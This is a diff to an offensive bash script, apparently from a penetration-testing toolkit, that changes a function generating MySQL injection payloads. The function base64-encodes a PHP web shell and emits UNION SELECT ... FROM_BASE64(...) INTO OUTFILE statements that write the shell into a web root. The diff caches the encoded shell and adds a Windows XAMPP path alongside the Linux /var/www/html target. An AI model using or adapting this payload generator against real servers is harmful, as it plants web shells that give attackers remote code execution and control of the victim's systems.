@@ -94,21 +94,32 @@ get_blind_sqli_commands() {
 }
 
 get_mysql_injection() {
-    if [[ ! -z "$1" ]]; then
-        webshell="$1"
-    fi    
-    if [[ -z $webshell ]]; then
-        create_php_web_shell
-        webshell=$(cat webshell.php)
+
+    if [[ -z "$base64_string" ]]; then
+        if [[ ! -z "$1" ]]; then
+            webshell="$1"
+        fi    
+        if [[ -z $webshell ]]; then
+            create_php_web_shell
+            webshell=$(cat webshell.php)
+        fi
+        webshell=$(minimize_script "$webshell")
+        webshell=$(echo "$webshell" | base64 -w 0)
+        base64_string=$webshell
     fi
-    webshell=$(minimize_script "$webshell")
-    webshell=$(echo "$webshell" | base64 -w 0)
 
     if [[ ! -z "$2" ]]; then
         outfile_location=$2
     fi
     if [[ -z "$outfile_location" ]]; then
-        outfile_location="/var/www/html/webshell.php"
+        if [[ -z $target_os ]] || [[ $target_os == "linux" ]]; then
+            outfile_location="/var/www/html/webshell.php"
+        elif [[ $target_os == "windows" ]]; then
+            outfile_location='C:\\xampp\\htdocs\\webshell.php'
+        else
+            echo "Target OS is not set or unsupported, using default Linux path for outfile location"
+            outfile_location="/var/www/html/webshell.php"
+        fi
     fi
     if [[ ! -z "$3" ]]; then
         num_sql_back_null="$3"
@@ -135,9 +146,9 @@ get_mysql_injection() {
     fi
     #into is not allowed inside subqueries, so we have to do union select
     if [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "union"  ]]; then
-        echo  " UNION SELECT $front_null_values FROM_BASE64('$webshell') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
+        echo  " UNION SELECT $front_null_values FROM_BASE64('$base64_string') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     else
-        echo  " SELECT FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
+        echo  " SELECT FROM_BASE64('$base64_string') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     fi
 }
 
